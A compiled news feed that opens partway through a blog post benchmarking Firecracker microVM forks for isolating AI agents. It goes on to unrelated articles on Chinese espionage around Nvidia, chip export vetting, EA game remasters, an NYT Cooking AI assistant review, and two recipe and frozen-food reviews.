Sixty-four forks of one snapshot, started at once on a four-core desktop CPU from 2015, are all answering in about 150 ms. On the Mac, 12 never got there. Per-VM time stays flat up to 4 and then grows much more slowly than N: 16 times the forks costs 5–6 times the latency.
The slowdown has a different shape, too. On bare metal both parts grow, and at N=64 the VMM part is 61% of the total. That’s plain CPU contention: 64 Firecracker processes and 64 guests want 8 hardware threads at the same moment. Starting at most 8 at a time keeps each fork at 26 ms, close to a single restore, and gets all 64 up in under a quarter of a second, against about three minutes on the Mac. Forks that each dirtied 64 MiB were ready in 32 ms. What they cost is memory.
So the cliff came from nested virtualization on my machine, not from Firecracker. Whether it’s Apple’s implementation, KVM’s nested stage-2 handling on arm64 or the two together, I can’t tell. Before trusting a fork-scaling number from a Mac like mine, plot it against N, and check it on bare metal.
What else this doesn’t cover
Quite a lot. It’s two hosts, one guest size and a synthetic workload. Real agents dirty far more memory than an idle fork, and my bare-metal box is a desktop from 2015, not a server. Snapshots are full only, so hibernating writes all 512 MiB every time, whatever changed. Snapshot files can’t change while any VM restored from them is running, so rotating a template means waiting for its forks to finish. The idle detector is a heuristic: a background dev server keeps a session awake forever, which is safe but costs money. And there’s no jailer, seccomp tuning or per-VM cgroups. This is a lab setup.
Shared pages are also a side channel. Firecracker’s pmem docs advise against sharing a backing file across VMs, and shared snapshot memory raises the same concern, so share within a tenant and never across tenants. Google says only that CPU side-channel mitigations are “applied”.
What I’d do differently in production
- Run every VM under the jailer, with its own chroot, uid, cgroup v2 slice and seccomp filter. The chroot also takes care of per-fork paths.
- Keep template pools per tenant and image, pinned in page cache on the hosts that serve them and rotated with refcounts, so a memory file is never deleted under a running fork.
- Load memory through UFFD when snapshots live on remote storage, and prefetch a recorded working set. Even from a local disk, a restore with a cold page cache took 66 ms instead of 25 ms on bare metal. Faulting a working set in over the network page by page would be much worse.
- Give memory back to the host before hibernating and after big jobs, with a balloon or free page reporting, so checkpoints and long-lived forks stay small.
- Split the proxy from the gateway. A minimal proxy per VM on the host adds an mTLS client identity, one SPIFFE identity per VM, and the credentials, scope checks and audit logs live on separate gateway machines. That’s Google’s split, and I think it’s the right one: a compromised host shouldn’t mean compromised tokens.
- Treat snapshots like code. Firecracker trusts snapshot files completely, so sign them, verify them before loading, and never load one from anywhere a guest could have written to.
- Reseed userspace after every fork, with a post-restore hook in the guest agent that reseeds language runtimes and regenerates instance IDs.
So, how much of it can you build?
Most of it. Copy-on-write forks from a warm snapshot, checkpointing driven by the tool-call lifecycle, and a guest with no NIC whose credentials stay on the host all work with open parts: Firecracker, its Go SDK and about 2,200 lines of glue. On a 2015 desktop CPU, a fork answers in 25 ms and costs about 3 MiB of host memory while idle. Isolation at container speed and density holds up, as long as the agents stay mostly idle and you don’t measure under nested virtualization.
What you can’t get from a single host is the rest of Google’s design: attested workload identities, a gateway on separate machines, and snapshots that move across a fleet. None of that is a VMM problem, and in a real system I’d expect it to take most of the effort.
The code, setup scripts, benchmark suite and raw results are at github.com/gophernaut/llm-learning/tree/main/agents-micro-vm. If you run ./scripts/run-bench.sh on other hardware, especially bare metal, please open a PR with your results/ directory. I’ll add your numbers to this post.

China's Top Spy Agency Recruited Woman Who Targeted Jensen Huang

China's Top Spy Agency Recruited Woman Who Targeted Jensen Huang (nytimes.com) 16
			
		 	
				An anonymous reader quotes a report from The New York Times: A Chinese businesswoman who had a close relationship with the chief executive of one of the most important artificial intelligence companies in the United States was a spy for China's Ministry of State Security, Beijing's top intelligence agency, according to people briefed on U.S. surveillance. The businesswoman, Alice Huang, was recruited by the ministry to collect intelligence on Jensen Huang, the chief executive of Nvidia, as part of a drive to learn more about American A.I. chips and potentially influence the company to push for its most advanced chips to be made available to China, the people said.
[...] The New York Times reported last week that Mr. Huang was a target of a Chinese intelligence operation, and that U.S. intelligence agencies were conducting electronic surveillance of Ms. Huang, a Chinese citizen, for at least a year. The Times reported that Mr. Trump had been briefed last year about Mr. Huang's relationship with her, but chose not to do anything about it. Ms. Huang speaks English well and has relationships with executives at the highest levels of the A.I. chip industry, including Mr. Huang and the leaders of Gigabyte, one of the top assemblers of Nvidia supercomputers, said people who have met her. She has attended industry conferences and private executive dinners. It is unclear when Ms. Huang first met Nvidia's leader. In 2024, around the time the two of them were photographed together at a bar in Taipei, her company, Megaspeed, began a multibillion-dollar purchase of advanced A.I. microchips.
To many in the industry, the well-funded push by Megaspeed into A.I. appeared to come out of nowhere. Ms. Huang was connected to a network of companies and investors clustered around Shanghai and Zhejiang province that had used their ties to local officials in Shanghai to push aggressively from mobile video games into data centers, which provide the computing power behind artificial intelligence. Megaspeed has been building data centers in Southeast Asia and then renting their computing power to Alibaba, the giant Chinese internet firm, giving China a backdoor way of getting access to advanced Nvidia chips. Nvidia is restricted by the United States from selling those chips directly to China. Beyond its local connections, the network also has a financial link to the Chinese military establishment, through an investment in a cybersecurity subsidiary of China Electronics Technology Group, one of the country's largest makers of military technology. Following the report, top Republican lawmakers have asked Jensen Huang to appear before Congress to answer questions. "Recent reports raise significant national security concerns regarding the People's Republic of China's access to sensitive US technology and information," representatives John Moolenaar, Brian Mast, and Rick Crawford said. "The issue of PRC infiltration and access to cutting-edge US technology is core to the investigative work of our three committees this Congress. It is vital that Congress determines the extent to which US national security has been placed at risk," the lawmakers added.

Next Time You Make Chicken Noodle Soup, Don’t Skip Emily Blunt’s Upgrade
Unknown
Unknown Publisher
2026-11-07
16:00:00 UTC
01:00:00 KST

Next Time You Make Chicken Noodle Soup, Don’t Skip Emily Blunt’s 1-Ingredient Upgrade
It is the beginning of sniffle season in my social circles. Whether you catch a cold or you’ve got the flu, you can never go wrong with making a big pot of healing soup. And in my opinion, the all-time best soup for comfort is chicken noodle.
I was recently flipping through one of Stanley Tucci’s old cookbooks, The Tucci Table: Cooking With Family and Friends from 2014, and saw a recipe from his famous sister-in-law, Emily Blunt. We are big fans of the actress here at The Kitchn, and I have actually personally written a story about her crispy potatoes that Jennifer Garner loves. Emily Blunt’s recipe for chicken noodle soup looked amazing, but what really made me want to try it was that she added barbecue sauce to the soup. Here’s what I thought after making it myself.
How to Make Emily Blunt’s Chicken Noodle Soup
- Cook the chicken. Slice a yellow onion into half-moons and spread out onto a lined baking sheet. Top with chicken legs and thighs, and season with olive oil, salt, black pepper, and fresh thyme. Bake for 40 minutes.
- Sauté the veggies. In a Dutch oven, sauté diced onion, carrot, and celery in olive oil until soft, and season with salt and pepper. Add garlic and ginger and cook until fragrant.
- Add the liquids and chicken. Pour in white wine and let it cook down for a few minutes. Then, add the chicken broth and bouillon cubes. Bring the pot to a boil and shred chicken while you wait.
- Simmer. Once the pot reaches a boil, turn it down to a simmer and add in shredded chicken and onions. Stir in barbecue sauce and throw in a bay leaf and a couple of chicken bones. Let the pot simmer on low for at least two hours.
- Cook the noodles. Before the soup is done simmering, bring a pot of salted water to a boil. Cook the egg noodles until al dente and drain.
- Remove bones and bay leaf and serve. After two hours, fish out the bay leaf and chicken bones. Add the noodles to your bowls and ladle the soup over them to serve.
My Honest Review of Emily Blunt’s Chicken Noodle Soup
If you read about Emily Blunt’s tip to add barbecue sauce to the soup and were a bit hesitant, you were not alone. The ingredient is actually listed as “optional” in the cookbook’s ingredients list, but I decided to trust Emily. And you absolutely should too because it makes the broth so delicious. In the book, Tucci writes that Emily says, “I don’t know why I started doing this — it sounds a bit random, but I tried it once, and I just think it adds a bit of a kick of flavor.” I have to agree with her. The broth is so flavorful (thanks to the barbecue sauce and chicken bouillon). The barbecue sauce in particular brings a slight sweetness and umami flavor. It’s similar to how a lot of people like to add soy sauce, in my eyes.
This cookbook’s recipe page does not have the total time for this recipe, but you should know that it is time-consuming. A lot of the cooking is hands-off, though. The pot spends two hours simmering on the stove, and the chicken also spends a good 40 minutes in the oven cooking (although you can make it ahead). It’s the perfect dish to put on the stove in the morning, and it’ll be ready for lunch. And all that time is so worth it. You can just tell from the broth’s color. It’s pure liquid gold.
I really liked how Emily recommends simmering the soup with some of the chicken bones so that it adds even more flavor, collagen, and protein to the broth. I actually used chicken bone broth instead of just broth for even more protein. Everyone has their preference on the best noodle to add to this soup, but I love egg noodles. They feel extra-comforting to me, even though my mom was a fan of angel hair broken into tiny bites. And then there’s this soup’s namesake ingredient: the chicken. It is just so tender and packed with flavor from baking and simmering. I have nothing bad to say. It almost makes me want to catch a cold.

Ultima and Wing Commander Remasters
Unknown
Unknown Publisher
2026-11-07
15:53:01 UTC
00:53:01 KST

Many people are not big fans of game publisher EA right now for good reason, but for those who remember a better time in the 1990s, there’s a little good news. Twenty-five classic games from that EA era have been lightly remastered and updated, then placed for sale on Steam and GOG, including several Wing Commander games and nearly the entire Ultima series.
Below is the full list of remastered or re-released games:
- Road Rash: 30th Anniversary Edition
- Wing Commander: 35th Anniversary Edition
- Wing Commander II: Vengeance of the Kilrathi: 35th Anniversary Edition
- Wing Commander III: Heart of the Tiger: 30th Anniversary Edition
- Wing Commander IV: The Price of Freedom: 30th Anniversary Edition
- Wing Commander Prophecy: 30th Anniversary Edition
- Privateer 2: The Darkening: 30th Anniversary Edition
- Wing Commander: Privateer
- Wing Commander: Academy
- Wing Commander: Armada
- Strike Commander
- Theme Hospital
- Crusader: No Remorse
- Crusader: No Regret
- Ultima I: The First Age of Darkness
- Ultima II: The Revenge of the Enchantress
- Ultima III: Exodus
- Ultima IV: Quest of the Avatar
- Ultima V: Warriors of Destiny
- Ultima VI: The False Prophet
- Ultima VII: The Complete Edition
- Ultima VIII: Gold Edition
- Ultima IX: Ascension
- Ultima Underworld I
- Ultima Underworld II
The story behind seven remasters
In a lengthy blog post published this week, Jim Vessella, a senior producer at EA, described the efforts that went into remastering Wing Commander I-IV and Prophecy, Privateer 2, and Road Rash.
It’s a long, detailed story that’s worth reading yourself, but here’s a top-level summary. After working on the mostly widely acclaimed Command & Conquer: Remastered Collection in 2019, Vessella writes that he learned about and visited a room at EA’s Redwood Shores campus that contained a large archive of poorly labeled or sorted physical media from ages past.
In his free time, and with the help of others, he began cataloging this archive and discovered, among other things, that it contained virtually the entirety of the original masters of Wing Commander III and Wing Commander IV‘s full-motion-video cutscenes.
The story that ensues involves building a small team of contractors, poring through the footage 17 hours a day on swing shifts to label and digitize it, and then coordinating with several key community members—particularly Matt Wells, who has made community enhancement patches for some of the Wing Commander games—to put together remasters of those games.

NYT Cooking’s AI assistant saved my weeknight chicken, but almost ruined my cake
Unknown
Unknown Publisher
2026-11-07
15:47:15 UTC
00:47:15 KST

Around 7PM each weeknight, I find myself standing in front of the fridge, trying to decide on something for dinner that won’t make my husband complain, “Chicken again?” Yes, I should meal plan more, but I don’t, so this is where I’m at. A nightly battle in which the chicken usually wins.
NYT Cooking’s AI assistant saved my weeknight chicken, but almost ruined my cake
I tested the new AI-powered tool on ingredient swaps, recipe scaling, and a missing Bundt pan.
Recently, my best weapon in this fight has been AI. Between Alexa Plus in the Echo smart display on my kitchen counter, the Samsung Food app on my fridge, and even an AI-powered cooking robot, AI has become my go-to sous chef — albeit one I need to keep a close eye on. It’s helped me swap ingredients, generate ideas, fix things when I mess up, and yes, even cook better. So I was intrigued when my go-to recipe app, NYT Cooking, introduced an AI assistant.
Many, including some NYT Cooking users and recipe purists, are skeptical of this new tool (available to subscribers on iOS only at launch), and I get why. One of the things I like most about NYT Cooking is that it features thousands of recipes from dozens of reputable sources — such as the New York Times archives, restaurants, cookbooks, and food columnists — and real people have tested them. (I’ve tried some purely AI-generated recipes and they were not good).
Another great feature of the service, which I’ve been paying for for several years, is the reader comments. Here, I’ve often found solutions to cooking dilemmas, like what to substitute for makrut lime leaves — there’s always one slightly bougie ingredient in an NYT Cooking recipe that I don’t have on hand.
However, reading through hundreds of comments to find answers at 7PM on a weeknight isn’t always practical. And this is where I’ve found the NYT Cooking assistant helpful. Among other things, it was trained on user comments, and in my few days testing it, it provided practical substitutions and solid cooking guidance for the new ingredients. It also won’t unquestionably agree to crazy requests (I tried!). As with all AI tools, it’s not perfect — it almost made me put half the required butter in my cake — but as a tool, it is useful and feels like a solid application of AI. Importantly, it doesn’t change the existing recipe; it leaves it as is and creates a new one for you.
It doesn’t change the existing recipe; it leaves it as is and creates a new one for you
The assistant appears in the app in a small text box on the recipe page with a prompt: “Customize this recipe…” From here, you type in a question to adapt it to your needs. This can be as simple as “What can I substitute for this ingredient?” to “Scale this recipe to feed seven people, and make it vegan and gluten-free.” The New York Times has also said the feature can suggest substitutions for cooking equipment and convert measurements; the latter option has been in the app for a couple of years.
Last Friday night, instead of staring aimlessly into the fridge, I turned to the Chicken folder in my NYT Cooking app Recipe Box and found a One-Pot Chicken and Rice With Ginger I’d been wanting to try. Only I didn’t have chicken thighs or half the ingredients.
I could have figured these steps myself, but it was nice to have validation that my modifications wouldn’t make the dish taste terrible.
I typed my dilemma into the assistant box on the recipe page: “I have chicken tenders, fresh ginger, garlic, rice, broth, limes, but no chard or cilantro or scallions. I do have green beans and red onions.” Within seconds, it created a new version of the recipe, with a new title: One-Pot Chicken and Rice With Ginger and Green Beans. It suggested a shorter browning time for the tenders, cooking the red onion alongside the chicken, and steaming the green beans on top of the rice for the last eight minutes instead of the chard. Every change was highlighted in the new recipe under a Your Version tab, and I could flip back to the original at any point.
I noticed it hadn’t adjusted for the lack of cilantro, saying it was optional. So I asked if I could use Thai basil, which I happen to have, and it agreed, highlighting how it would change the flavor. While I could have figured out a lot of these steps myself, maybe with the help of Google, it was nice to have validation that my modifications wouldn’t make the dish taste terrible and nice not to have to swipe out of the app. The NYT Cooking editors say it’s been trained not to comply with requests that will taste bad.
The resulting dish — which took the same amount of time to cook as the original — was delicious and got my husband’s seal of approval (he just had the leftovers for lunch). It was very different from the recipe Yasmin Fahr wrote, and I can see the purists’ point. But the rewritten recipe was much easier to use and produced a better dish than winging it with my own subs gleaned from the comments section, which I usually do with varying degrees of success.
I cook regularly, so I had a sense of what ingredients I had on hand that might work for the dish I wanted to make. But the assistant can also help if you have no idea what to use as a substitute. For example, I was cooking a Thai red curry and asked what I could use instead of makrut lime leaf. It replied, saying that grated lime zest would work, but “it misses the deeper floral, herbal aroma” of fresh limes. (See? Bougie.)
Over the weekend, I tried several more swaps, asking whether half-and-half would work instead of cream in a caramel apple Dutch baby, or if Castelvetrano olives and smoked paprika could stand in for kalamata and chile pepper in a roasted halibut dish. Swapping spices is always a bold move in any dish, as it can really ruin the flavor.
I also had the app convert the Dutch baby recipe’s metric weights to US measurements, which it did seamlessly. Then I threw in some curveballs. How about using fresh cayenne peppers with the halibut? It warned me that substituting cayenne for chile “brings significant, sharp heat.” Could I swap ladyfingers for minced beef in this trifle (à la Rachel Green in Friends)? “Minced beef cannot be used in place of the ladyfingers or anywhere in this sweet dessert trifle.” Good call.
While I was cooking, I compared the NYT Cooking assistant with Alexa Plus, Amazon’s generative-AI voice assistant I regularly use to help me cook via the Echo Show 11 smart display in my kitchen. Interestingly, it offered the same guidance as the Cooking assistant on substitutions for the chicken and rice dish, but with slightly different cooking times. Alexa pulls some recipes from the NYT app through a partnership between the companies.
However, Alexa couldn’t show the modified recipe on its screen; it could only tell me the changes while showing the original. When I asked it to walk me through them, it got confused and improvised, telling me to cut the chicken into bite-sized pieces — which wasn’t in the modified recipe. Overall, I found using the Cooking app more reliable, although messier. It would be great to be able to use voice control to navigate the app, as I can with Alexa on my smart display, rather than using my garlicky fingers.
Time for a bigger challenge: baking.
I am typically not a baker. My cakes come out flat, and my cookies don’t crumble. Even the smart mixer I tested a few years ago couldn’t save me. I also rarely have the right equipment. So I took Cinnamon Roll Bundt Cake, a recipe by NYT Cooking editor Genevieve Ko (who announced the AI feature), and asked it to turn it into muffins. (Who has a Bundt cake pan?!)
It modified the recipe’s cooking time from three hours to 50 minutes and split the batter across two 12-muffin tins. But that was going to make 24 muffins, way too many for me. So I asked it to halve the recipe to get 12 muffins. This led to some smart choices, like halving five eggs to three instead of an unhelpful two and a half.
For science, I bought a Bundt pan to make the original version too. Both turned out great, but things got a bit sticky when I swapped between the original recipe and the AI version in the app. You can’t save your new recipe separately, which caused confusion when I was cooking the original. Instead of scrolling back through the recipe with sticky fingers, I asked the assistant how much butter I needed (using voice typing), and it gave me the modified recipe’s 6 tablespoons rather than the original’s three-quarter cup, without telling me which version it was using. You can delete your version, which I would advise doing to avoid issues like this — 6 tablespoons of butter would have made for a dry cake.
If you already read all the comments before starting a New York Times recipe, then you will probably find this tool offers a similar experience in a more streamlined way. For everyday problems — wrong cut of chicken, no cilantro, or no Bundt cake pan — it was genuinely helpful and saved me a trip to the store. It was also smart enough to know when to say no to minced beef in a trifle.
As with every AI tool I’ve used in the kitchen, the NYT Cooking AI assistant works well as a sous chef, but it’s not the head chef — I still felt the need to double-check amounts and cooking times and cross-reference them with the original to make sure it hadn’t done something outlandish.
If you’re a purist, you can just ignore the assistant. While you can’t turn off the chat box, it’s easy to scroll past. I do think it will make me use the app more often, since I no longer need to worry as much when I don’t have makrut lime leaves on hand or the right cut of meat. For me, standing in front of the fridge with chicken tenders and no plan, it’s been a useful addition to my nightly cooking routine.
Photos by Jennifer Pattison Tuohy / The Verge

The US let Nvidia sell chips to an empty office in China
Unknown
Unknown Publisher
2026-11-07
15:43:45 UTC
00:43:45 KST

Concerns are being raised that neither the Commerce Department nor Nvidia are doing their due diligence when it comes to vetting Chinese firms cleared to handle the company’s H200 AI chips. According to The New York Times, New Matrix is on the list of approved firms, yet its offices are empty, “a hollow gray shell with wires dangling from the ceiling where lights should be.” In fact, the paper could find little evidence that the company exists in any meaningful way:
The US let Nvidia sell chips to an empty office in China
The government is approving sales of Nvidia’s AI chips to Chinese firms with ties to blacklisted companies.
Only scant information can be found online about New Matrix, which was created 17 months ago. At the building that New Matrix lists as its address, a company directory does not include the firm. At the nearby property management agency for the industrial park, a receptionist and a manager both said they had no record of the company.
What little information can be found about New Matrix is concerning. Its owners have ties to a Chinese private equity firm that has been blacklisted by the US government since 2024. And according to the Times, this is not a rare lapse in oversight, but a troubling pattern of companies connected to entities with national-security-related trade restrictions being approved to purchase Nvidia chips.
Nvidia had been restricted from selling chips to China during the Biden presidency. But the Trump administration relaxed those limits after Nvidia agreed to give the government a 15-percent cut of all sales. The company’s CEO, Jensen Huang, also launched an intense lobbying campaign and was apparently targeted by China’s Ministry of State Security in a spying plot.

I Compared Marie Callender’s Legendary Frozen Chicken Pot Pie Against This Fan-Favorite, and Found the Clear Winner
Unknown
Unknown Publisher
2026-11-07
15:30:00 UTC
00:30:00 KST

I Compared Marie Callender’s Legendary Frozen Chicken Pot Pie Against This Fan-Favorite, and Found the Clear Winner
There are few things more comforting to me during the cold months (which are a little longer here in New England) than chicken soup and, by extension, chicken pot pie. The flaky crust, the rich golden gravy with chunks of tender chicken, and nourishing peas and carrots — it’s a beautiful thing.
I love homemade chicken pot pie, but it can be a lot of work. I’ve probably only made a dozen or so of them in my adulthood. More often than not, I go a semi-homemade route with pre-made pie dough or, better yet, frozen puff pastry laid over the top of a casserole full of thick chicken stew. Although a homemade one is very satisfying (both in labor and taste), there’s something so nice about the convenience of a pre-made chicken pot pie.
Fortunately there are a lot of options for decent ready-to-eat pot pies, but which one is the very best? These days, when our dollars are stretched ever thinner at the grocery store, no one wants to waste money on a soggy crust or lackluster filling. So I tried two legendary options to find the very best frozen chicken pot pie.
Meet the Contenders
Not to get all Old Man Yells at Cloud on you, but there are, frankly, too many options when it comes to pot pies. There are numerous brands and then, among those brands, even more varieties like size, flavors, and pot pies even made for certain dietary restrictions (like gluten-free and vegetarian). For the purposes of this taste test, I decided to keep it simple and stick to single-serving pie from popular brands.
This is the pot pie of my youth, a classic, and if you’re very into the crust over the filling, probably the pot pie for you. After baking in the oven for 50 minutes (at 400°F), the crust browned and the thick, salty gravy covered tender bits of chicken, peas, and carrots. I found the gravy for the filling to be a bit runny as it cools, but overall it’s perfectly pleasant.
I had never tried this brand until this taste test, but I know it’s a favorite among some of my colleagues. I can see why. The sauce is very flavorful with what tastes like a decent amount of black pepper — not overpowering, but enough to know that it’s there. The chicken is very tender, and the peas, carrots, and potatoes are lovely. 
The sauce was also a bit thinner, which I appreciated. The crust is really where it’s at on this one, as it seems to be puff pastry and only a single layer of it on top. I think the addition of potatoes makes up for the lack of a bottom crust.
So, Which One Is the Best Frozen Chicken Pot Pie?
Blake’s chicken pot pie really knocked it out of the park (which, in hindsight, makes sense: Mara, director of groceries and shopping at The Kitchn, waxed poetic about it before). The crust was great — buttery and flaky — and there was exactly enough of it. 
I think Marie Callender’s pot pie, while the crust is tasty, is a bit imbalanced: too much crust, not enough filling. Again, that might be a plus for some folks. But even with my ratio preference with regard to filling and crust in mind, the filling just tasted a lot better in the Blake’s chicken pot pie. 
Consider me a convert. All hail Blake’s; long live the Blake’s.
Buy: Blake’s Chicken Pot Pie, $4.96 for 8 ounces at Walmart
What’s your favorite frozen chicken pot pie? Tell us about it in the comments below.
